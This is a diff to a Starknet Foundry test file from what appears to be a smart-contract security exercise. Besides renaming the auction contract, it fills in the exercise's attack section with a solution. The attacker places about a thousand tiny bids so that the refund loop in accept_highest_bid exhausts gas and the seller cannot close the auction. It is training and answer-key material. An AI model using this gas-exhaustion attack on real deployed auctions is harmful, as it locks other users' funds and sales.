@@ -1,17 +1,19 @@
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
-use openzeppelin_token::erc721::interface::{IERC721Dispatcher, IERC721DispatcherTrait};
+use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
+use openzeppelin_token::erc721::interface::IERC721DispatcherTrait;
 
-use starknet::{ContractAddress};
+use starknet::ContractAddress;
 use snforge_std::{declare, ContractClassTrait, DeclareResultTrait,  start_cheat_caller_address, stop_cheat_caller_address};
-use dedos::auction::metaverse_auction::{
-    IMetaverseAucionDispatcher, IMetaverseAucionDispatcherTrait
+use dedos::auction::auction::{
+    IAuctionDispatcher, IAuctionDispatcherTrait
 };
 use dedos::utils::helpers;
 
 
-fn deploy_auction(currency: ContractAddress, nft: ContractAddress) -> (ContractAddress, IMetaverseAucionDispatcher) {
+fn deploy_auction(currency: ContractAddress, nft: ContractAddress) 
+-> (ContractAddress, IAuctionDispatcher) 
+{
     // Declaring the contract class
-    let contract_class = declare("MetaverseAucion").unwrap().contract_class();
+    let contract_class = declare("Auction").unwrap().contract_class();
     // Creating the data to send to the constructor, first specifying as a default value
     let mut data_to_constructor = Default::default();
     // Pack the data into the constructor
@@ -19,7 +21,7 @@ fn deploy_auction(currency: ContractAddress, nft: ContractAddress) -> (ContractA
     Serde::serialize(@nft, ref data_to_constructor);
     // Deploying the contract, and getting the address
     let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
-    return (address, IMetaverseAucionDispatcher { contract_address: address });
+    return (address, IAuctionDispatcher { contract_address: address });
 }
 
 #[test]
@@ -39,7 +41,7 @@ fn test_auction_attack() {
     helpers::mint_erc20(eth_address, alice, 10 * helpers::one_ether());
     helpers::mint_erc20(eth_address, charlie, 10 * helpers::one_ether());
     helpers::mint_erc20(eth_address, attacker, 10 * helpers::one_ether());
-    // Mint an NFT to Bob and Alice
+    // Mint an NFT to Bob
     helpers::mint_nft(nft_address, bob, 1);
 
     // Check the balances
@@ -94,8 +96,20 @@ fn test_auction_attack() {
     stop_cheat_caller_address(auction_address);
 
     // ATTACK START //
-    // TODO: Implement your attack so Charlie won't be able to accept the highest bid and close the auction
-    // NOTE: After your code the test for this exercise should be broken and revert.
+    // Prevent Charlie from accepting the highest bid and close the auction
+    // Create a lot of bids for the same item
+    // When Charlie calls the `accept_highest_bid` function, the internal
+    // while loop refunding the losing bids will revert due to gas limits
+    let mut i: u256 = 2;
+    while i < 1000 {
+        start_cheat_caller_address(eth_address, attacker);
+        eth_dispatcher.approve(auction_address, i);
+        stop_cheat_caller_address(eth_address);
+        start_cheat_caller_address(auction_address, attacker);
+        auction_dispatcher.bid(1, i);
+        stop_cheat_caller_address(auction_address);
+        i += 1;
+    }
 
     // ATTACK END //
 
